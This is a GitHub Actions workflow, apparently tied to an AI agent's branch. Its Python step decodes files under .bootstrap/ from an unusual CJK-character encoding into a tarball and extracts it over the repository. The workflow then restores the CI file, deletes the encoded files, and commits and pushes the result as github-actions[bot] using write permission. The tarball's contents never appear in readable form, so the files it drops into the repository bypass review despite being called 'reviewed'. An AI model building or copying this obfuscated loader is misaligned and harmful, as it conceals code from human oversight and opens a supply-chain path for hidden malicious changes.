name: bootstrap-sentinel-2.1

on:
  pull_request:
    branches: [main]
    types: [synchronize]

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-24.04
    steps:
      - name: Check out feature branch
        uses: actions/checkout@v6
        with:
          ref: codex/sentinel-2.1-validation-pack
          fetch-depth: 0

      - name: Rebuild reviewed validation overlay
        shell: bash
        run: |
          set -euo pipefail
          cp .github/workflows/ci.yml /tmp/original-ci.yml
          cat .bootstrap/u-* > /tmp/overlay.b32768
          python - <<'PY'
          from pathlib import Path

          text = Path("/tmp/overlay.b32768").read_text(encoding="utf-8")
          pad_text, payload = text.split(":", 1)
          pad = int(pad_text)
          bits = "".join(f"{ord(char) - 0x3400:015b}" for char in payload)
          if pad:
              bits = bits[:-pad]
          if len(bits) % 8:
              raise SystemExit("decoded bitstream is not byte-aligned")
          data = bytes(int(bits[index:index + 8], 2) for index in range(0, len(bits), 8))
          Path("/tmp/overlay.tar.gz").write_bytes(data)
          PY
          echo "e41f213f261febcec386bd2009e60d5eb89519264ecb18c166057f9178e75ff6  /tmp/overlay.tar.gz" | sha256sum --check --strict
          tar -xzf /tmp/overlay.tar.gz
          cp /tmp/original-ci.yml .github/workflows/ci.yml
          python - <<'PY'
          from pathlib import Path

          path = Path("docs/BUILD_LOG.md")
          path.write_text(path.read_text(encoding="utf-8").rstrip() + "\n", encoding="utf-8")
          PY
          rm -rf .bootstrap
          git diff --check

      - name: Commit validation pack
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "test: add real-world validation pack"
          git push origin HEAD:codex/sentinel-2.1-validation-pack
